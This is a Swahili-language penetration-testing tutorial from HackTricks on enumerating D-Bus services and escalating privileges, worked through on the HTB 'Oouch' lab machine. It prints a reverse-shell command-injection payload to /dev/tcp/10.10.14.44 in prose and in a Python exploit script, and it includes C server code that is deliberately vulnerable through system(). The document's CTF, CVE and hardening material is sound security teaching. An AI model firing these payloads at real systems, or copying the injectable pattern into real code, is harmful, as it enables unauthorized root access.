# Enumeration ya D-Bus & Kuongezwa kwa Privilege kupitia Command Injection

{{#include ../../banners/hacktricks-training.md}}

## **Enumeration ya GUI**

D-Bus hutumika kama mpatanishi wa mawasiliano kati ya michakato (IPC) katika mazingira ya desktop ya Ubuntu. Kwenye Ubuntu, kuna message buses kadhaa zinazoendesha kwa wakati mmoja: system bus, ambayo hutumiwa hasa na **huduma zenye privilege kuonyesha huduma zinazohusiana na mfumo mzima**, na session bus kwa kila mtumiaji aliyeingia, ambayo huonyesha huduma zinazohusiana na mtumiaji huyo pekee. Hapa tunazingatia hasa system bus kwa sababu inahusishwa na huduma zinazoendesha kwa privilege za juu (kwa mfano, root), kwa kuwa lengo letu ni kuongeza privilege. Inafaa kutajwa kuwa usanifu wa D-Bus hutumia 'router' kwa kila session bus, ambayo ina jukumu la kuelekeza ujumbe wa clients kwa huduma zinazofaa kulingana na address iliyotajwa na clients kwa huduma wanayotaka kuwasiliana nayo.

Huduma kwenye D-Bus hufafanuliwa na **objects** na **interfaces** zinazoonyesha. Objects zinaweza kufananishwa na instances za class katika lugha za kawaida za OOP, ambapo kila instance hutambuliwa kipekee kwa kutumia **object path**. Path hii, sawa na filesystem path, hutambua kipekee kila object inayoonyeshwa na huduma. Interface muhimu kwa madhumuni ya utafiti ni **org.freedesktop.DBus.Introspectable** interface, yenye method moja pekee, Introspect. Method hii hurejesha uwakilishi wa XML wa methods, signals na properties zinazoungwa mkono na object; hapa tunazingatia methods huku tukiacha properties na signals.

Kwa mawasiliano na D-Bus interface, tools mbili zilitumika: CLI tool inayoitwa **gdbus**, kwa ajili ya kuita kwa urahisi methods zinazoonyeshwa na D-Bus ndani ya scripts, na [**D-Feet**](https://wiki.gnome.org/Apps/DFeet), GUI tool inayotegemea Python iliyoundwa kwa ajili ya ku-enumerate huduma zinazopatikana kwenye kila bus na kuonyesha objects zilizomo ndani ya kila huduma.
```bash
sudo apt-get install d-feet
```
Ikiwa unakagua **session bus**, thibitisha kwanza anwani ya sasa:
```bash
echo "$DBUS_SESSION_BUS_ADDRESS"
```
![https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-21.png](https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-21.png)

![https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-22.png](https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-22.png)

Katika picha ya kwanza, services zilizosajiliwa kwenye D-Bus system bus zinaonyeshwa, huku **org.debin.apt** ikiwa imeangaziwa mahususi baada ya kuchagua kitufe cha System Bus. D-Feet huuliza service hii kuhusu objects, na kuonyesha interfaces, methods, properties, na signals za objects zilizochaguliwa, kama inavyoonekana kwenye picha ya pili. Signature ya kila method pia imeelezwa kwa kina.

Kipengele muhimu ni kuonyeshwa kwa **process ID (pid)** na **command line** ya service, jambo linalosaidia kuthibitisha ikiwa service inaendeshwa kwa elevated privileges, hali ambayo ni muhimu kwa utafiti.

**D-Feet pia inaruhusu method invocation**: users wanaweza kuingiza Python expressions kama parameters, ambazo D-Feet hubadilisha kuwa D-Bus types kabla ya kuzipeleka kwenye service.

Hata hivyo, zingatia kwamba **baadhi ya methods huhitaji authentication** kabla ya kuturuhusu kuzi-invoke. Tutapuuza methods hizi, kwa kuwa lengo letu ni kuinua privileges zetu bila credentials tangu mwanzo.

Pia zingatia kwamba baadhi ya services huuliza D-Bus service nyingine inayoitwa org.freedeskto.PolicyKit1 ikiwa user anapaswa kuruhusiwa kutekeleza actions fulani au la.

## **Cmd line Enumeration**

### List Service Objects

Inawezekana kuorodhesha D-Bus interfaces zilizofunguliwa kwa:
```bash
busctl list #List D-Bus interfaces

NAME                                   PID PROCESS         USER             CONNECTION    UNIT                      SE
:1.0                                     1 systemd         root             :1.0          init.scope                -
:1.1345                              12817 busctl          qtc              :1.1345       session-729.scope         72
:1.2                                  1576 systemd-timesyn systemd-timesync :1.2          systemd-timesyncd.service -
:1.3                                  2609 dbus-server     root             :1.3          dbus-server.service       -
:1.4                                  2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
:1.6                                  2612 systemd-logind  root             :1.6          systemd-logind.service    -
:1.8                                  3087 unattended-upgr root             :1.8          unattended-upgrades.serv… -
:1.820                                6583 systemd         qtc              :1.820        user@1000.service         -
com.ubuntu.SoftwareProperties            - -               -                (activatable) -                         -
fi.epitest.hostap.WPASupplicant       2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
fi.w1.wpa_supplicant1                 2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
htb.oouch.Block                       2609 dbus-server     root             :1.3          dbus-server.service       -
org.bluez                                - -               -                (activatable) -                         -
org.freedesktop.DBus                     1 systemd         root             -             init.scope                -
org.freedesktop.PackageKit               - -               -                (activatable) -                         -
org.freedesktop.PolicyKit1               - -               -                (activatable) -                         -
org.freedesktop.hostname1                - -               -                (activatable) -                         -
org.freedesktop.locale1                  - -               -                (activatable) -                         -
```
Huduma zilizowekwa alama ya **`(activatable)`** zinavutia hasa kwa sababu **bado hazifanyi kazi**, lakini ombi la bus linaweza kuzianzisha inapohitajika. Usisimame kwenye `busctl list`; husisha majina hayo na binary halisi ambazo zingetekelezwa.
```bash
ls -la /usr/share/dbus-1/system-services/ /usr/share/dbus-1/services/ 2>/dev/null
grep -RInE '^(Name|Exec|User)=' /usr/share/dbus-1/system-services /usr/share/dbus-1/services 2>/dev/null
```
Hilo linakuonyesha kwa haraka ni njia gani ya `Exec=` itakayoanzishwa kwa jina linaloweza kuamilishwa na chini ya utambulisho upi. Ikiwa binary au chain yake ya utekelezaji imelindwa kwa udhaifu, service isiyotumika bado inaweza kuwa njia ya privilege-escalation.

#### Miunganisho

[From wikipedia:](https://en.wikipedia.org/wiki/D-Bus) Wakati process inaweka connection kwenye bus, bus huipa connection jina maalum la bus linaloitwa _unique connection name_. Majina ya bus ya aina hii hayawezi kubadilishwa—imehakikishwa kuwa hayatabadilika mradi connection ipo—na, muhimu zaidi, hayawezi kutumika tena wakati wa maisha ya bus. Hii inamaanisha kuwa hakuna connection nyingine kwenye bus hiyo itakayowahi kupewa unique connection name hiyo, hata ikiwa process hiyo hiyo itafunga connection kwenye bus na kuunda mpya. Unique connection names hutambulika kwa urahisi kwa sababu huanza na character ya colon, ambayo kwa kawaida hairuhusiwi.

### Maelezo ya Service Object

Kisha, unaweza kupata baadhi ya taarifa kuhusu interface kwa kutumia:
```bash
busctl status htb.oouch.Block #Get info of "htb.oouch.Block" interface

PID=2609
PPID=1
TTY=n/a
UID=0
EUID=0
SUID=0
FSUID=0
GID=0
EGID=0
SGID=0
FSGID=0
SupplementaryGIDs=
Comm=dbus-server
CommandLine=/root/dbus-server
Label=unconfined
CGroup=/system.slice/dbus-server.service
Unit=dbus-server.service
Slice=system.slice
UserUnit=n/a
UserSlice=n/a
Session=n/a
AuditLoginUID=n/a
AuditSessionID=n/a
UniqueName=:1.3
EffectiveCapabilities=cap_chown cap_dac_override cap_dac_read_search
cap_fowner cap_fsetid cap_kill cap_setgid
cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
cap_mknod cap_lease cap_audit_write cap_audit_control
cap_setfcap cap_mac_override cap_mac_admin cap_syslog
cap_wake_alarm cap_block_suspend cap_audit_read
PermittedCapabilities=cap_chown cap_dac_override cap_dac_read_search
cap_fowner cap_fsetid cap_kill cap_setgid
cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
cap_mknod cap_lease cap_audit_write cap_audit_control
cap_setfcap cap_mac_override cap_mac_admin cap_syslog
cap_wake_alarm cap_block_suspend cap_audit_read
InheritableCapabilities=
BoundingCapabilities=cap_chown cap_dac_override cap_dac_read_search
cap_fowner cap_fsetid cap_kill cap_setgid
cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
cap_mknod cap_lease cap_audit_write cap_audit_control
cap_setfcap cap_mac_override cap_mac_admin cap_syslog
cap_wake_alarm cap_block_suspend cap_audit_read
```
Pia linganisha jina la bus na unit yake ya `systemd` na njia ya executable:
```bash
systemctl status dbus-server.service --no-pager
systemctl cat dbus-server.service
namei -l /root/dbus-server
```
Hii inajibu swali la kiutendaji muhimu wakati wa privesc: **ikiwa method call itafaulu, ni binary na unit gani halisi itakayotekeleza kitendo hicho?**

### Orodhesha Interfaces za Service Object

Unahitaji kuwa na permissions za kutosha.
```bash
busctl tree htb.oouch.Block #Get Interfaces of the service object

└─/htb
└─/htb/oouch
└─/htb/oouch/Block
```
### Introspect Interface ya Service Object

Kumbuka kwamba katika mfano huu, interface ya hivi karibuni iliyogunduliwa ilichaguliwa kwa kutumia parameter ya `tree` (_tazama sehemu iliyotangulia_):
```bash
busctl introspect htb.oouch.Block /htb/oouch/Block #Get methods of the interface

NAME                                TYPE      SIGNATURE RESULT/VALUE FLAGS
htb.oouch.Block                     interface -         -            -
.Block                              method    s         s            -
org.freedesktop.DBus.Introspectable interface -         -            -
.Introspect                         method    -         s            -
org.freedesktop.DBus.Peer           interface -         -            -
.GetMachineId                       method    -         s            -
.Ping                               method    -         -            -
org.freedesktop.DBus.Properties     interface -         -            -
.Get                                method    ss        v            -
.GetAll                             method    s         a{sv}        -
.Set                                method    ssv       -            -
.PropertiesChanged                  signal    sa{sv}as  -            -
```
Zingatia method `.Block` ya interface `htb.oouch.Block` (ile tunayovutiwa nayo). "s" ya columns nyingine inaweza kumaanisha kwamba inatarajia string.

Kabla ya kujaribu jambo lolote hatari, thibitisha kwanza method ya **read-oriented** au yenye risk ndogo kwa njia nyingine. Hii hutenganisha kwa uwazi hali tatu: syntax isiyo sahihi, inayofikika lakini imekataliwa, au inayofikika na inaruhusiwa.
```bash
busctl call org.freedesktop.login1 /org/freedesktop/login1 org.freedesktop.login1.Manager CanReboot
gdbus call --system --dest org.freedesktop.login1 --object-path /org/freedesktop/login1 --method org.freedesktop.login1.Manager.CanReboot
```
### Kuhusisha D-Bus Methods na Policies na Actions

Introspection inakuambia **unachoweza kuita**, lakini haikuambii **kwa nini call inaruhusiwa au inakataliwa**. Kwa privesc triage halisi, kwa kawaida unahitaji kuchunguza **tabaka tatu kwa pamoja**:

1. **Activation metadata** (faili za `.service` au `SystemdService=`) ili kubaini ni binary na unit gani itakayoendeshwa.
2. **D-Bus XML policy** (`/etc/dbus-1/system.d/`, `/usr/share/dbus-1/system.d/`) ili kubaini ni nani anayeweza kutumia `own`, `send_destination`, au `receive_sender`.
3. **Polkit action files** (`/usr/share/polkit-1/actions/*.policy`) ili kubaini authorization model ya msingi (`allow_active`, `allow_inactive`, `auth_admin`, `auth_self`, `org.freedesktop.policykit.imply`).

Commands muhimu:
```bash
grep -RInE '^(Name|Exec|SystemdService|User)=' /usr/share/dbus-1/system-services /usr/share/dbus-1/services 2>/dev/null
grep -RInE '<(allow|deny) (own|send_destination|receive_sender)=|user=|group=' /etc/dbus-1/system.d /usr/share/dbus-1/system.d /etc/dbus-1/system-local.d 2>/dev/null
grep -RInE 'allow_active|allow_inactive|auth_admin|auth_self|org\.freedesktop\.policykit\.imply' /usr/share/polkit-1/actions 2>/dev/null
pkaction --verbose
```
Usidhani kuwa kuna ulinganifu wa 1:1 kati ya method ya D-Bus na action ya Polkit. Method hiyo hiyo inaweza kuchagua action tofauti kulingana na object inayorekebishwa au context ya wakati wa utekelezaji. Kwa hiyo workflow ya kivitendo ni:

1. `busctl introspect` / `gdbus introspect`
2. `pkaction --verbose` na kutafuta kwenye mafaili husika ya `.policy`
3. live probes zenye risk ndogo kwa kutumia `busctl call`, `gdbus call`, au `dbusmap --enable-probes --null-agent`

Proxy au compatibility services zinahitaji umakini wa ziada. **Proxy inayotumia root** na ku-forward requests kwenye D-Bus service nyingine kupitia connection yake iliyoanzishwa awali inaweza kusababisha backend ichukulie kila request kuwa inatoka kwa UID 0, isipokuwa identity ya caller wa awali ithibitishwe tena.

### Monitor/Capture Interface

Ukiwa na privileges za kutosha (privileges za `send_destination` na `receive_sender` pekee hazitoshi) unaweza **monitor D-Bus communication**.

Ili **monitor** **communication**, utahitaji kuwa **root.** Ikiwa bado unakumbana na matatizo ukiwa root, angalia [https://piware.de/2013/09/how-to-watch-system-d-bus-method-calls/](https://piware.de/2013/09/how-to-watch-system-d-bus-method-calls/) na [https://wiki.ubuntu.com/DebuggingDBus](https://wiki.ubuntu.com/DebuggingDBus)

> [!WARNING]
> Ikiwa unajua jinsi ya kusanidi faili ya D-Bus config ili **kuruhusu non-root users kunusa** communication, tafadhali **wasiliana nami**!

Njia tofauti za kufanya monitor:
```bash
sudo busctl monitor htb.oouch.Block #Monitor only specified
sudo busctl monitor #System level, even if this works you will only see messages you have permissions to see
sudo dbus-monitor --system #System level, even if this works you will only see messages you have permissions to see
```
Katika mfano ufuatao, interface `htb.oouch.Block` inafuatiliwa na **ujumbe "**_**lalalalal**_**" unatumiwa kupitia mawasiliano yasiyo sahihi**:
```bash
busctl monitor htb.oouch.Block

Monitoring bus message stream.
‣ Type=method_call  Endian=l  Flags=0  Version=1  Priority=0 Cookie=2
Sender=:1.1376  Destination=htb.oouch.Block  Path=/htb/oouch/Block  Interface=htb.oouch.Block  Member=Block
UniqueName=:1.1376
MESSAGE "s" {
STRING "lalalalal";
};

‣ Type=method_return  Endian=l  Flags=1  Version=1  Priority=0 Cookie=16  ReplyCookie=2
Sender=:1.3  Destination=:1.1376
UniqueName=:1.3
MESSAGE "s" {
STRING "Carried out :D";
};
```
Unaweza kutumia `capture` badala ya `monitor` kuhifadhi matokeo katika faili ya **pcapng** ambalo Wireshark inaweza kufungua:
```bash
sudo busctl capture htb.oouch.Block > dbus-htb.oouch.Block.pcapng
sudo busctl capture > system-bus.pcapng
```
#### Kuchuja kelele zote <a href="#filtering_all_the_noise" id="filtering_all_the_noise"></a>

Ikiwa kuna taarifa nyingi sana kwenye bus, pitisha match rule kama ifuatavyo:
```bash
dbus-monitor "type=signal,sender='org.gnome.TypingMonitor',interface='org.gnome.TypingMonitor'"
```
Rules nyingi zinaweza kubainishwa. Ikiwa ujumbe unalingana na _rule_ yoyote, ujumbe huo utachapishwa. Kama hivi:
```bash
dbus-monitor "type=error" "sender=org.freedesktop.SystemToolsBackends"
```

```bash
dbus-monitor "type=method_call" "type=method_return" "type=error"
```
Angalia [hati za D-Bus](http://dbus.freedesktop.org/doc/dbus-specification.html) kwa maelezo zaidi kuhusu sintaksia ya match rule.

### Zaidi

`busctl` ina chaguo zaidi, [**yapata yote hapa**](https://www.freedesktop.org/software/systemd/man/busctl.html).

## **Hali Hatarishi**

Kama mtumiaji **qtc ndani ya host "oouch" kutoka HTB**, unaweza kupata **faili ya usanidi ya D-Bus isiyotarajiwa** iliyoko katika _/etc/dbus-1/system.d/htb.oouch.Block.conf_:
```xml
<?xml version="1.0" encoding="UTF-8"?> <!-- -*- XML -*- -->

<!DOCTYPE busconfig PUBLIC
"-//freedesktop//DTD D-BUS Bus Configuration 1.0//EN"
"http://www.freedesktop.org/standards/dbus/1.0/busconfig.dtd">

<busconfig>

<policy user="root">
<allow own="htb.oouch.Block"/>
</policy>

<policy user="www-data">
<allow send_destination="htb.oouch.Block"/>
<allow receive_sender="htb.oouch.Block"/>
</policy>

</busconfig>
```
Kumbuka kutoka kwenye configuration ya awali kwamba **utahitaji kuwa user `root` au `www-data` ili kutuma na kupokea taarifa** kupitia mawasiliano haya ya D-BUS.

Ukiwa user **qtc** ndani ya docker container **aeb4525789d8**, unaweza kupata code inayohusiana na dbus kwenye faili _/code/oouch/routes.py._ Hii ndiyo code inayohusika:
```python
if primitive_xss.search(form.textfield.data):
bus = dbus.SystemBus()
block_object = bus.get_object('htb.oouch.Block', '/htb/oouch/Block')
block_iface = dbus.Interface(block_object, dbus_interface='htb.oouch.Block')

client_ip = request.environ.get('REMOTE_ADDR', request.remote_addr)
response = block_iface.Block(client_ip)
bus.close()
return render_template('hacker.html', title='Hacker')
```
Kama unavyoona, **inaunganisha kwenye D-Bus interface** na kutuma **"client_ip"** kwenye **function ya "Block"**.

Upande mwingine wa muunganisho wa D-Bus kuna binary ya C iliyocompiliwa inayofanya kazi. Code hii **inasikiliza** kwenye muunganisho wa D-Bus **kwa anwani ya IP na inaita iptables kupitia function ya `system`** ili kuzuia anwani ya IP iliyotolewa.\
**Muitio wa `system` umewekwa kuwa vulnerable kwa makusudi kwa command injection**, kwa hiyo payload kama ifuatayo itaunda reverse shell: `;bash -c 'bash -i >& /dev/tcp/10.10.14.44/9191 0>&1' #`

### Itumie

Mwishoni mwa ukurasa huu unaweza kupata **code kamili ya C ya D-Bus application**. Ndani yake unaweza kupata kati ya mistari 91-97 **jinsi `D-Bus object path`** **na `interface name`** zilivyosajiliwa. Taarifa hii itahitajika kutuma taarifa kwenye muunganisho wa D-Bus:
```c
/* Install the object */
r = sd_bus_add_object_vtable(bus,
&slot,
"/htb/oouch/Block",  /* interface */
"htb.oouch.Block",   /* service object */
block_vtable,
NULL);
```
Pia, katika mstari wa 57 unaweza kuona kwamba **method pekee iliyosajiliwa** kwa mawasiliano haya ya D-Bus inaitwa `Block`(_**Ndiyo sababu katika sehemu inayofuata payloads zitatumwa kwenye service object `htb.oouch.Block`, interface `/htb/oouch/Block` na jina la method `Block`**_):
```c
SD_BUS_METHOD("Block", "s", "s", method_block, SD_BUS_VTABLE_UNPRIVILEGED),
```
#### Python

Kifuatacho python code kitatuma payload kwenye muunganisho wa D-Bus kwa `Block` method kupitia `block_iface.Block(runme)` (_kumbuka kwamba ilitolewa kutoka kwenye kipande cha awali cha code_):
```python
import dbus
bus = dbus.SystemBus()
block_object = bus.get_object('htb.oouch.Block', '/htb/oouch/Block')
block_iface = dbus.Interface(block_object, dbus_interface='htb.oouch.Block')
runme = ";bash -c 'bash -i >& /dev/tcp/10.10.14.44/9191 0>&1' #"
response = block_iface.Block(runme)
bus.close()
```
#### busctl na dbus-send
```bash
dbus-send --system --print-reply --dest=htb.oouch.Block /htb/oouch/Block htb.oouch.Block.Block string:';pring -c 1 10.10.14.44 #'
```
- `dbus-send` ni tool inayotumika kutuma ujumbe kwenye “Message Bus”
- Message Bus – Software inayotumiwa na systems kurahisisha mawasiliano kati ya applications. Inahusiana na Message Queue (messages hupangwa kwa mfuatano) lakini katika Message Bus messages hutumwa kwa subscription model na pia kwa haraka sana.
- Tag ya “-system” hutumika kuonyesha kwamba huu ni ujumbe wa system, si ujumbe wa session (kwa default).
- Tag ya “–print-reply” hutumika kuchapisha ujumbe wetu ipasavyo na kupokea replies zozote katika format inayoweza kusomeka na binadamu.
- “–dest=Dbus-Interface-Block” Ni address ya Dbus interface.
- “–string:” – Aina ya ujumbe tunaotaka kutuma kwenye interface. Kuna formats kadhaa za kutuma messages kama double, bytes, booleans, int, objpath. Kati ya hizi, “object path” ni muhimu tunapotaka kutuma path ya file kwenye Dbus interface. Katika hali hii tunaweza kutumia special file (FIFO) kupitisha command kwenye interface kwa jina la file. “string:;” – Hii ni kuita object path tena mahali tunapoweka FIFO reverse shell file/command.

_Note kwamba katika `htb.oouch.Block.Block`, sehemu ya kwanza (`htb.oouch.Block`) inarejelea service object na sehemu ya mwisho (`.Block`) inarejelea method name._

### C code
```c:d-bus_server.c
//sudo apt install pkgconf
//sudo apt install libsystemd-dev
//gcc d-bus_server.c -o dbus_server `pkg-config --cflags --libs libsystemd`

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <systemd/sd-bus.h>

static int method_block(sd_bus_message *m, void *userdata, sd_bus_error *ret_error) {
char* host = NULL;
int r;

/* Read the parameters */
r = sd_bus_message_read(m, "s", &host);
if (r < 0) {
fprintf(stderr, "Failed to obtain hostname: %s\n", strerror(-r));
return r;
}

char command[] = "iptables -A PREROUTING -s %s -t mangle -j DROP";

int command_len = strlen(command);
int host_len = strlen(host);

char* command_buffer = (char *)malloc((host_len + command_len) * sizeof(char));
if(command_buffer == NULL) {
fprintf(stderr, "Failed to allocate memory\n");
return -1;
}

sprintf(command_buffer, command, host);

/* In the first implementation, we simply ran command using system(), since the expected DBus
* to be threading automatically. However, DBus does not thread and the application will hang
* forever if some user spawns a shell. Thefore we need to fork (easier than implementing real
* multithreading)
*/
int pid = fork();

if ( pid == 0 ) {
/* Here we are in the child process. We execute the command and eventually exit. */
system(command_buffer);
exit(0);
} else {
/* Here we are in the parent process or an error occured. We simply send a genric message.
* In the first implementation we returned separate error messages for success or failure.
* However, now we cannot wait for results of the system call. Therefore we simply return
* a generic. */
return sd_bus_reply_method_return(m, "s", "Carried out :D");
}
r = system(command_buffer);
}


/* The vtable of our little object, implements the net.poettering.Calculator interface */
static const sd_bus_vtable block_vtable[] = {
SD_BUS_VTABLE_START(0),
SD_BUS_METHOD("Block", "s", "s", method_block, SD_BUS_VTABLE_UNPRIVILEGED),
SD_BUS_VTABLE_END
};


int main(int argc, char *argv[]) {
/*
* Main method, registeres the htb.oouch.Block service on the system dbus.
*
* Paramaters:
*      argc            (int)             Number of arguments, not required
*      argv[]          (char**)          Argument array, not required
*
* Returns:
*      Either EXIT_SUCCESS ot EXIT_FAILURE. Howeverm ideally it stays alive
*      as long as the user keeps it alive.
*/


/* To prevent a huge numer of defunc process inside the tasklist, we simply ignore client signals */
signal(SIGCHLD,SIG_IGN);

sd_bus_slot *slot = NULL;
sd_bus *bus = NULL;
int r;

/* First we need to connect to the system bus. */
r = sd_bus_open_system(&bus);
if (r < 0)
{
fprintf(stderr, "Failed to connect to system bus: %s\n", strerror(-r));
goto finish;
}

/* Install the object */
r = sd_bus_add_object_vtable(bus,
&slot,
"/htb/oouch/Block",  /* interface */
"htb.oouch.Block",   /* service object */
block_vtable,
NULL);
if (r < 0) {
fprintf(stderr, "Failed to install htb.oouch.Block: %s\n", strerror(-r));
goto finish;
}

/* Register the service name to find out object */
r = sd_bus_request_name(bus, "htb.oouch.Block", 0);
if (r < 0) {
fprintf(stderr, "Failed to acquire service name: %s\n", strerror(-r));
goto finish;
}

/* Infinite loop to process the client requests */
for (;;) {
/* Process requests */
r = sd_bus_process(bus, NULL);
if (r < 0) {
fprintf(stderr, "Failed to process bus: %s\n", strerror(-r));
goto finish;
}
if (r > 0) /* we processed a request, try to process another one, right-away */
continue;

/* Wait for the next request to process */
r = sd_bus_wait(bus, (uint64_t) -1);
if (r < 0) {
fprintf(stderr, "Failed to wait on bus: %s\n", strerror(-r));
goto finish;
}
}

finish:
sd_bus_slot_unref(slot);
sd_bus_unref(bus);

return r < 0 ? EXIT_FAILURE : EXIT_SUCCESS;
}
```
## Wasaidizi wa Automated Enumeration (2023-2025)

Enumeration ya attack surface kubwa ya D-Bus kwa mikono kwa kutumia `busctl`/`gdbus` huwa ngumu haraka. Zana mbili ndogo za FOSS zilizotolewa katika miaka michache iliyopita zinaweza kuharakisha kazi wakati wa engagements za red-team au CTF:

### dbusmap ("Nmap for D-Bus")
* Author: @taviso – [https://github.com/taviso/dbusmap](https://github.com/taviso/dbusmap)
* Imeandikwa kwa C; single static binary (<50 kB) inayopitia kila object path, inachukua Introspect XML na kuihusisha na PID/UID inayomiliki.
* Flags muhimu:
```bash
# List every service on the *system* bus and dump all callable methods
sudo dbus-map --dump-methods

# Actively probe methods/properties you can reach without Polkit prompts
sudo dbus-map --enable-probes --null-agent --dump-methods --dump-properties
```
* Zana huweka alama ya `!` kwenye well-known names zisizolindwa, na hivyo kuonyesha mara moja services unazoweza *own* (kuziteka) au method calls zinazoweza kufikiwa kutoka kwenye unprivileged shell.

### uptux.py
* Author: @initstring – [https://github.com/initstring/uptux](https://github.com/initstring/uptux)
* Ni script ya Python-only inayotafuta paths zenye *writable* katika systemd units **na** D-Bus policy files zenye ruhusa kubwa kupita kiasi (kwa mfano `send_destination="*"`).
* Matumizi ya haraka:
```bash
python3 uptux.py -n          # run all checks but don’t write a log file
python3 uptux.py -d          # enable verbose debug output
```
* D-Bus module hutafuta katika directories zilizo hapa chini na kuonyesha service yoyote inayoweza ku-spoofiwa au kutekwa na normal user:
* `/etc/dbus-1/system.d/` na `/usr/share/dbus-1/system.d/`
* `/etc/dbus-1/system-local.d/` (vendor overrides)

---

## Bugs Muhimu za D-Bus Privilege-Escalation (2024-2025)

Kufuatilia CVEs zilizochapishwa hivi karibuni husaidia kugundua patterns kama hizo katika custom code. Mifano miwili mizuri ya hivi karibuni ni:

| Year | CVE | Component | Root Cause | Offensive lesson |
|------|-----|-----------|------------|------------------|
| 2024 | CVE-2024-45752 | `logiops` ≤ 0.3.4 (`logid`) | Service inayoendesha kama root ilifichua D-Bus interface ambayo unprivileged users wangeweza kuisanidi upya, ikiwemo kupakia macro behavior inayodhibitiwa na attacker. | Ikiwa daemon inafichua **device/profile/config management** kwenye system bus, chukulia writable configuration na macro features kama code-execution primitives, si "settings" tu. |
| 2025 | CVE-2025-23222 | Deepin `dde-api-proxy` ≤ 1.0.19 | Compatibility proxy inayoendesha kama root ilipeleka requests kwa backend services bila kuhifadhi security context ya caller wa awali, hivyo backends iliichukulia proxy kama UID 0. | Chukulia **proxy / bridge / compatibility** D-Bus services kama bug class tofauti: ikiwa zinapeleka privileged calls, thibitisha jinsi caller UID/Polkit context inavyofikishwa kwenye backend. |

Patterns za kuzingatia:
1. Service inaendesha **kama root kwenye system bus**.
2. Ama hakuna authorization check, au check inafanywa dhidi ya **subject isiyo sahihi**.
3. Method inayoweza kufikiwa hatimaye hubadilisha system state: package install, mabadiliko ya user/group, bootloader config, device profile updates, file writes, au direct command execution.

Tumia `dbusmap --enable-probes` au manual `busctl call` kuthibitisha kama method inaweza kufikiwa, kisha kagua policy XML ya service na Polkit actions ili kuelewa **subject gani** hasa ina-authorizewa.

---

## Hardening & Detection Quick-Wins

* Tafuta policies zenye world-writable au zilizo wazi kwa *send/receive*:
```bash
grep -R --color -nE '<allow (own|send_destination|receive_sender)="[^"]*"' /etc/dbus-1/system.d /usr/share/dbus-1/system.d
```
* Sisitiza Polkit kwa methods hatari – hata *root* proxies zinapaswa kupitisha PID ya *caller* kwa `polkit_authority_check_authorization_sync()` badala ya PID yao wenyewe.
* Ondoa privileges katika helpers zinazoendelea kwa muda mrefu (tumia `sd_pid_get_owner_uid()` kubadilisha namespaces baada ya kuunganisha kwenye bus).
* Ikiwa huwezi kuondoa service, angalau *scope* kwenye dedicated Unix group na uzuie access katika XML policy yake.
* Blue-team: capture system bus kwa `busctl capture > /var/log/dbus_$(date +%F).pcapng` na u-import kwenye Wireshark kwa anomaly detection.

---

## References

- [https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/](https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/)
- [https://github.com/PixlOne/logiops/issues/473](https://github.com/PixlOne/logiops/issues/473)
- [https://security.opensuse.org/2025/01/24/dde-api-proxy-privilege-escalation.html](https://security.opensuse.org/2025/01/24/dde-api-proxy-privilege-escalation.html)
{{#include ../../banners/hacktricks-training.md}}
